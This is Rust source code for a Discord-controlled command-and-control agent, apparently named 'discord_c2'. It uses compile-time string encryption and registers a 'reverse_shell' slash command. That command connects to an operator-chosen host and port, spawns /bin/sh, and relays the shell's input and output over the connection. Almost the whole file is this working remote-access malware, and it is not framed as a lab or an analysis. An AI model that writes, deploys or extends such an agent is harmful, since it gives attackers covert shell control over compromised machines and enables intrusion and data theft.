use std::{net::IpAddr, process::Stdio, sync::Arc};

use config::AgentConfig;
use constants::RUSCORD_GUILD_ID;
use futures::StreamExt;
use poise::serenity_prelude::{self as serenity};
use tokio::{
	io::{AsyncReadExt, AsyncWriteExt},
	net::TcpStream,
	process::Command,
	sync::Mutex,
};
use tokio_util::codec::{FramedRead, LinesCodec};
use tracing::{info, warn};
use tracing_subscriber::EnvFilter;
mod config;

macro_rules! say {
    ($ctx:expr, $fmt:expr $(, $arg:expr)*) => {
        if let Err(why) = $ctx.say(format!($fmt, $($arg),*)).await {
            tracing::error!("error sending discord message: {}", why);
        }
    }
}

#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

pub mod constants {
	include!(concat!(env!("OUT_DIR"), "/constants.rs"));
}

pub struct Data {
	pub config: AgentConfig,
}

pub type Error = Box<dyn std::error::Error + Send + Sync>;
pub type Context<'a> = poise::Context<'a, Data, Error>;


/// Initializes a reverse shell
#[poise::command(slash_command)]
async fn reverse_shell(ctx: Context<'_>, #[description = "Listening Host"] ip: IpAddr, #[description = "Listening Port"] port: u16) -> Result<(), Error> {
	match TcpStream::connect((ip, port)).await {
		Ok(stream) => {
			say!(ctx, "successfully connected to {}:{}", ip, port);
			let mut cmd = Command::new("/bin/sh")
				.stderr(Stdio::piped())
				.stdin(Stdio::piped())
				.stdout(Stdio::piped())
				.spawn()?;

			let (tcp_read, tcp_write) = stream.into_split();
			let (tcp_read, tcp_write) = (Arc::new(Mutex::new(tcp_read)), Arc::new(Mutex::new(tcp_write)));

			// Handle stdout
			if let Some(stdout) = cmd.stdout.take() {
				let mut reader = FramedRead::new(stdout, LinesCodec::new());
				tokio::spawn({
					let cloned_write = tcp_write.clone();
					async move {
						while let Some(Ok(line)) = reader.next().await {
							let mut guard = cloned_write.lock().await;
							guard.write_all(line.as_bytes()).await.unwrap();
							guard.write_all(&[b'\n']).await.unwrap();
							guard.flush().await.unwrap();
						}
					}
				});
			}

			// Handle stderr
			if let Some(stderr) = cmd.stderr.take() {
				let mut reader = FramedRead::new(stderr, LinesCodec::new());
				tokio::spawn(async move {
					while let Some(Ok(line)) = reader.next().await {
						let mut guard = tcp_write.lock().await;
						guard.write_all(line.as_bytes()).await.unwrap();
						guard.write_all(&[b'\n']).await.unwrap();
						guard.flush().await.unwrap();
					}
				});
			}

			// Handle stdin
			if let Some(mut stdin) = cmd.stdin.take() {
				let mut reader = [0; 8024 * 2];
				tokio::spawn(async move {
					while let Ok(n) = tcp_read.lock().await.read(&mut reader).await {
						if n == 0 {
							break;
						}
						stdin.write_all(&reader[..n]).await.unwrap();
                        stdin.flush().await.unwrap();
					}
				});
			}
		},
		Err(error) => {
			say!(ctx, "failed to connect to listener at `{}:{}`: \n> \"{}\"", ip, port, error);
		},
	}

	Ok(())
}

#[poise::command(prefix_command)]
pub async fn register(ctx: Context<'_>) -> Result<(), Error> {
	poise::builtins::register_application_commands_buttons(ctx).await?;
	Ok(())
}

#[tokio::main]
async fn main() {
	std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
	tracing_subscriber::fmt().with_env_filter(EnvFilter::from_default_env()).init();
	let token = std::env::var("DISCORD_TOKEN").expect("missing DISCORD_TOKEN");
	let intents = serenity::GatewayIntents::non_privileged();

	let framework = poise::Framework::builder()
		.options(poise::FrameworkOptions {
			commands: vec![reverse_shell(), register()],
			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
			..Default::default()
		})
		.setup(|ctx, _ready, framework| {
			Box::pin(async move {
				poise::builtins::register_in_guild(ctx, &framework.options().commands, RUSCORD_GUILD_ID).await?;
				Ok(Data {
					config: AgentConfig {
						command_channel: serenity::ChannelId::new(1103128052537507931),
                        category_channel: serenity::ChannelId::new(1103128052537507931),
					},
				})
			})
		})
		.build();

	let mut client = serenity::ClientBuilder::new(token, intents).framework(framework).await.unwrap();
	client.start().await.unwrap();
}

async fn event_handler(
	ctx: &serenity::Context,
	event: &serenity::FullEvent,
	_framework: poise::FrameworkContext<'_, Data, Error>,
	data: &Data,
) -> Result<(), Error> {
	match event {
		serenity::FullEvent::Ready { data_about_bot } => {
			info!("logged in as {}", data_about_bot.user.name);
			let channel_id = data.config.command_channel;
			channel_id.say(&ctx.http, "Herro there!").await?;
		},
		serenity::FullEvent::Message { .. } => {},
		serenity::FullEvent::Ratelimit { data } => {
			warn!("ratelimited: {:?}", data);
		},
		_ => {},
	}
	Ok(())
}
